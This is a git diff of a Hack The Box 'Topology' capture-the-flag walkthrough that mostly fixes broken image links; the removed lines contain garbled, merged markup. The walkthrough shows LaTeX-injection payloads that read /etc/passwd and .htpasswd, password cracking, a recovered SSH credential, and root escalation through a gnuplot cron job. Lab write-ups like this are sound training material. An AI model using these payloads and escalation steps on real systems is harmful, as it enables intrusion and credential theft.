@@ -2,7 +2,7 @@
 title: Hack The Box - Topology
 date: 2023-09-05 13:33:37 +0200
 categories:
-  - HTB
+  - HackTheBox
 tags:
   - HTB
 comments: true
@@ -24,7 +24,7 @@ Add the machine Ip to: `/etc/hosts`
 
 Navigating to the site:
 
-![](assets/img/posts/pasted-image-20260819192048.png))
+![556](Pasted%20image%2020260819192048.png)
 
 We will found a link: <http://latex.topology.htb/equation.php> , so we will add it to the: `/etc/hosts`
 	`10.10.11.217 topology.htb latex.topology.htb`
@@ -47,11 +47,11 @@ Fuzzing for subdomains eventually we get three hits. The first one `dev` retur
 
 Browsing to `latex` we see this:
 
-![](assets/img/posts/pasted-image-20260822103845.png))
+![](Pasted%20image%2020260822103845.png)
 
 I decide to take a look at `equation.php`
 
-![](assets/img/posts/pasted-image-20260822103858.png))
+![](Pasted%20image%2020260822103858.png)
 
 
 
@@ -71,7 +71,7 @@ It is found that there may be a file reading vulnerability. so trying some comma
 \closein\file
 ```
 
-![](assets/img/posts/20250816232104.png))
+![[Pasted image 20250816232104.png]]
 
 **Now There are Two Problems:**
 - How to read multiple lines?
@@ -95,7 +95,11 @@ http://latex.topology.htb/equation.php?eqn=
 \verbatiminput{/etc/passwd}
 ```
 
-![](/asset`pasted-image-20260822113123.png`et`pasted-image-20260822112910.png` command `\lstinputlisting{/usr/share/texmf/web2c/texmf.cnf}` will not trigger WAF
+![](Pasted%20image%2020260822113123.png)
+
+![](Pasted%20image%2020260822112910.png)
+
+Only the command `\lstinputlisting{/usr/share/texmf/web2c/texmf.cnf}` will not trigger WAF
 But when using this command to read `/etc/passwd`, what is returned is a blank page.
 
 Regarding to the second question **What file to read?**
@@ -120,7 +124,9 @@ $\lstinputlisting{/var/www/dev/.htpasswd}$
 
 The output will be:
 
-![](/asset`pasted-image-20260822111918.png` with john:
+![](Pasted%20image%2020260822111918.png)
+
+Crack it with john:
 ```
 john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt 
 ```
@@ -130,7 +136,9 @@ We Now have a username and password `vdaisley:calculus20`
 
 We can log-in to: `dev.topology.htb`
 
-![596](/as`pasted-image-20260819203313.png` to login with SSH:
+![596](Pasted%20image%2020260819203313.png)
+
+Lets try to login with SSH:
 ```
 ssh vdaisley@10.10.11.217
 Password: calculus20
@@ -151,7 +159,9 @@ Password: calculus20
 -bash-5.0/tmp$ ./linpeas
 ```
 
-![767](/as`pasted-image-20260819203811.png` an unusual directory that I can write to: `/opt/gnuplot`. Weird, only write permissions, no read permissions.
+![767](Pasted%20image%2020260819203811.png)
+
+There is an unusual directory that I can write to: `/opt/gnuplot`. Weird, only write permissions, no read permissions.
 
 Second, upload `pspy64` script to the machine, and run it to see what processes are running on the system: 
 ```
@@ -162,13 +172,15 @@ emily@pilgrimage:~$ ./pspy64
 ```
 We notice some interesting activity, and some timing tasks were found too
 
-![](assets/img/posts/20250816232348.png))
+![[Pasted image 20250816232348.png]]
 
 In the scheduled task, search for the file with the suffix `.plt` in the` /opt/gnuplot` directory with root authority and execute it directly, then you can write any `.plt` file to execute our command.
 
 In the `/var/www/` directory, we discovered a new possible subdomain: `stats`
 
-![](/assets/img/post`pasted-image-20260819204407.png`c/hosts`
+![](Pasted%20image%2020260819204407.png)
+
+So add it to: `/etc/hosts`
 	`10.10.11.217 topology.htb latex.topology.htb dev.topology.htb stats.topology.htb`
 
 Apparently, root (UID=0) is finding and executing files that have the `.plt` ending. A `.plt` file is typically associated with GNU Plot `gnuplot`, which is a command-line driven plotting utility used for generating 2D and 3D plots. Gnuplot reads commands from a script file with a `.plt` extension to generate graphical plots based on the provided data.
@@ -185,7 +197,9 @@ vdaisley@topology:/opt/gnuplot$ /usr/bin/bash -p
 bash-5.0# whoami          //root
 ```
 
-![](/assets/img/post`pasted-image-20260819204806.png`
+![](Pasted%20image%2020260819204806.png)
+
+Find the root user
 ```
 cd /root
 cat root.txt
